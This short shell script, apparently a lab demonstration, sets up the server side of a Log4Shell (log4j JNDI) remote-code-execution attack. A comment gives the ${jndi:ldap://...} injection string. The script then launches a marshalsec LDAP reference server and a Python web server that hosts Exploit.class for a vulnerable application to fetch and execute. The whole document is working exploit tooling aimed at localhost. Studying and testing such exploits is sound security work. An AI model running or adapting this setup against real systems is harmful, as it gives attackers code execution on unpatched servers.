# If a vulnerable application use log4j to log a string
# logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
# The LDAPRefServer will respond the byte code from http://127.0.0.1:8888/Exploit.class
# And then the byte code will be excuted by the vulnerable application

remote_code='http://127.0.0.1:8888/#Exploit'

# LDAP reference server redirects the request to the web server with remote code
# In this case we host the remove code in a python web server listening on port 8888
java -cp \
marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.jndi.LDAPRefServer \
"${remote_code}" \
&> ./LDAP-reference-server.log &

# Python web server hosting the remote code
# http://127.0.0.1:8888/Exploit.class
python3 -m http.server 8888 \
&> ./remote-code-web-server.log &

# Note: you need to manually kill the two processes above
